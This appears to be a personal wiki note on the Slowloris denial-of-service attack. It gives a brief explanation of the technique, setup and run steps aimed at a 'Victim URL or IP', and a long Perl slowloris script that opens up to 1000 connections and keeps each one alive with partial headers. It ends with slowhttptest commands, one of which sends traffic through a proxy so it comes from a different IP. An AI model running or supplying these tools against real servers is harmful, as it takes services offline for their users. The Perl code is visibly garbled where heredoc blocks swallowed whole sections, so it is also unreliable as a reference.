---
title: "Slow Loris"
created: 2019-10-08T22:12:37.877-05:00
modified: 2023-05-07T12:09:23.896-05:00
parent: "[[Denial of Service (DoS)]]"
children: []
---
###### Slow Loris
````excerpt
- is a type of [[Denial of Service (DoS)|denial-of-service]] attack tool by keeping many connections to the target web server open and holds them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to—but never completing—the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, and eventually denying additional connection attempts from clients
````
^excerpt

# Implementation

> [!expand]- perl
> Requirements:
> <span style="white-space: pre-wrap"><code>sudo apt-get update  </code><br><code>sudo apt-get install perl </code><br><code>sudo apt-get install libwww-mechanize-shell-perl</code><br><code>sudo apt-get install perl-mechanize</code></span>
>
> 1. Download [slowloris.pl](http://slowloris.pl/)
> 2. Open Terminal
> 3. cd /thePathToYourSlowloris.plFile
> 4. ./[slowloris.pl](http://slowloris.pl/)
> 5. perl [slowloris.pl](http://slowloris.pl/) -dns (Victim URL or IP) -options
>
> [slowloris.pl](http://slowloris.pl/)
> ```perl
> #!/usr/bin/perl -w
> use strict;
> use IO::Socket::INET;
> use IO::Socket::SSL;
> use Getopt::Long;
> use Config;
>  
> $SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors
>  
> print < \$shost,
>     'dns=s'     => \$host,
>     'httpready' => \$httpready,
>     'num=i'     => \$connections,
>     'cache'     => \$cache,
>     'port=i'    => \$port,
>     'https'     => \$ssl,
>     'tcpto=i'   => \$tcpto,
>     'test'      => \$test,
>     'timeout=i' => \$timeout,
>     'version'   => \$version,
> );
> if ($version) {
>     print "Version 0.7\n";
>     exit;
> }
> unless ($host) {
>     print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
>     print "\n\tType 'perldoc $0' for help with options.\n\n";
>     exit;
> }
> unless ($port) {
>     $port = 80;
>     print "Defaulting to port 80.\n";
> }
> unless ($tcpto) {
>     $tcpto = 5;
>     print "Defaulting to a 5 second tcp connection timeout.\n";
> }
> unless ($test) {
>     unless ($timeout) {
>         $timeout = 100;
>         print "Defaulting to a 100 second re-try timeout.\n";
>     }
>     unless ($connections) {
>         $connections = 1000;
>         print "Defaulting to 1000 connections.\n";
>     }
> }
> my $usemultithreading = 0;
> if ( $Config{usethreads} ) {
>     print "Multithreading enabled.\n";
>     $usemultithreading = 1;
>     use threads;
>     use threads::shared;
> }
> else {
>     print "No multithreading capabilites found!\n";
>     print "Slowloris will be slower than normal as a result.\n";
> }
> my $packetcount : shared     = 0;
> my $failed : shared          = 0;
> my $connectioncount : shared = 0;
> srand() if ($cache);
> if ($shost) {
>     $sendhost = $shost;
> }
> else {
>     $sendhost = $host;
> }
> if ($httpready) {
>     $method = "POST";
> }
> else {
>     $method = "GET";
> }
> if ($test) {
>     my @times = ( "2", "30", "90", "240", "500" );
>     my $totaltime = 0;
>     foreach (@times) {
>         $totaltime = $totaltime + $_;
>     }
>     $totaltime = $totaltime / 60;
>     print "This test could take up to $totaltime minutes.\n";
>     my $delay   = 0;
>     my $working = 0;
>     my $sock;
>     if ($ssl) {
>         if (
>             $sock = new IO::Socket::SSL(
>                 PeerAddr => "$host",
>                 PeerPort => "$port",
>                 Timeout  => "$tcpto",
>                 Proto    => "tcp",
>             )
>           )
>         {
>             $working = 1;
>         }
>     }
>     else {
>         if (
>             $sock = new IO::Socket::INET(
>                 PeerAddr => "$host",
>                 PeerPort => "$port",
>                 Timeout  => "$tcpto",
>                 Proto    => "tcp",
>             )
>           )
>         {
>             $working = 1;
>         }
>     }
>     if ($working) {
>         if ($cache) {
>             $rand = "?" . int( rand(99999999999999) );
>         }
>         else {
>             $rand = "";
>         }
>         my $primarypayload =
>             "GET /$rand HTTP/1.1\r\n"
>           . "Host: $sendhost\r\n"
>           . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
>           . "Content-Length: 42\r\n";
>         if ( print $sock $primarypayload ) {
>             print "Connection successful, now comes the waiting game...\n";
>         }
>         else {
>             print
> "That's odd - I connected but couldn't send the data to $host:$port.\n";
>             print "Is something wrong?\nDying.\n";
>             exit;
>         }
>     }
>     else {
>         print "Uhm... I can't connect to $host:$port.\n";
>         print "Is something wrong?\nDying.\n";
>         exit;
>     }
>     for ( my $i = 0 ; $i <= $#times ; $i++ ) {
>         print "Trying a $times[$i] second delay: \n";
>         sleep( $times[$i] );
>         if ( print $sock "X-a: b\r\n" ) {
>             print "\tWorked.\n";
>             $delay = $times[$i];
>         }
>         else {
>             if ( $SIG{__WARN__} ) {
>                 $delay = $times[ $i - 1 ];
>                 last;
>             }
>             print "\tFailed after $times[$i] seconds.\n";
>         }
>     }
>     if ( print $sock "Connection: Close\r\n\r\n" ) {
>         print "Okay that's enough time. Slowloris closed the socket.\n";
>         print "Use $delay seconds for -timeout.\n";
>         exit;
>     }
>     else {
>         print "Remote server closed socket.\n";
>         print "Use $delay seconds for -timeout.\n";
>         exit;
>     }
>     if ( $delay < 166 ) {
>         print < "$host",
>                             PeerPort => "$port",
>                             Timeout  => "$tcpto",
>                             Proto    => "tcp",
>                         )
>                       )
>                     {
>                         $working[$z] = 1;
>                     }
>                     else {
>                         $working[$z] = 0;
>                     }
>                 }
>                 else {
>                     if (
>                         $sock[$z] = new IO::Socket::INET(
>                             PeerAddr => "$host",
>                             PeerPort => "$port",
>                             Timeout  => "$tcpto",
>                             Proto    => "tcp",
>                         )
>                       )
>                     {
>                         $working[$z] = 1;
>                         $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
>                     }
>                     else {
>                         $working[$z] = 0;
>                     }
>                 }
>                 if ( $working[$z] == 1 ) {
>                     if ($cache) {
>                         $rand = "?" . int( rand(99999999999999) );
>                     }
>                     else {
>                         $rand = "";
>                     }
>                     my $primarypayload =
>                         "$method /$rand HTTP/1.1\r\n"
>                       . "Host: $sendhost\r\n"
>                       . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
>                       . "Content-Length: 42\r\n";
>                     my $handle = $sock[$z];
>                     if ($handle) {
>                         print $handle "$primarypayload";
>                         if ( $SIG{__WARN__} ) {
>                             $working[$z] = 0;
>                             close $handle;
>                             $failed++;
>                             $failedconnections++;
>                         }
>                         else {
>                             $packetcount++;
>                             $working[$z] = 1;
>                         }
>                     }
>                     else {
>                         $working[$z] = 0;
>                         $failed++;
>                         $failedconnections++;
>                     }
>                 }
>                 else {
>                     $working[$z] = 0;
>                     $failed++;
>                     $failedconnections++;
>                 }
>             }
>         }
>         print "\t\tSending data.\n";
>         foreach my $z ( 1 .. $num ) {
>             if ( $working[$z] == 1 ) {
>                 if ( $sock[$z] ) {
>                     my $handle = $sock[$z];
>                     if ( print $handle "X-a: b\r\n" ) {
>                         $working[$z] = 1;
>                         $packetcount++;
>                     }
>                     else {
>                         $working[$z] = 0;
>                         #debugging info
>                         $failed++;
>                         $failedconnections++;
>                     }
>                 }
>                 else {
>                     $working[$z] = 0;
>                     #debugging info
>                     $failed++;
>                     $failedconnections++;
>                 }
>             }
>         }
>         print
> "Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
>         sleep($timeout);
>     }
> }
> sub domultithreading {
>     my ($num) = @_;
>     my @thrs;
>     my $i                    = 0;
>     my $connectionsperthread = 50;
>     while ( $i < $num ) {
>         $thrs[$i] =
>           threads->create( \&doconnections, $connectionsperthread, 1 );
>         $i += $connectionsperthread;
>     }
>     my @threadslist = threads->list();
>     while ( $#threadslist > 0 ) {
>         $failed = 0;
>     }
> }
> __END__
> =head1 TITLE
> Slowloris by llaera
> =head1 VERSION
> Version 1.0 Stable
> =head1 DATE
> 02/11/2013
> =head1 AUTHOR
> Laera Loris llaera@outlook.com
> =head1 ABSTRACT
> Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
> =head1 AFFECTS
> Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?
> =head1 NOT AFFECTED
> IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
>
> ```

> [!expand]- slowhttptest
> # Installation
>
> > [!expand]- homebrew
> > <strong>1. install slowhttptes</strong>t
> > <span style="white-space: pre-wrap"><code>  brew update && brew install slowhttptest</code></span>
> >
> > <strong>2. verify slowhttptest was installed</strong>
> > <span style="white-space: pre-wrap"><code>   which slowhttptest</code></span>
> # Commands
>
> > [!expand]- Click here to expand...
> > [https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage](https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage)
> >
> > <strong>1. Example of usage in slow body mode:</strong>
> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port\]/ -x 10 -p 3 -B -s 8192</code></span>
> >
> > <strong>2. Example of usage in slow head mode:</strong>
> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -g -i 10 -r 200 -t CUSTOM\_HTTP\_VERB -u https://host\[:port\]/ -x 10 -p 3 -H</code></span>
> >
> > <strong>3. Example of usage in slow read mode with probing through proxy at x.x.x.x:8080 to have website availability from IP different than yours:</strong>
> > <span style="white-space: pre-wrap"><code>  slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u https://host\[:port\]/ -p 5 -l 350 -e x.x.x.x:8080</code></span>
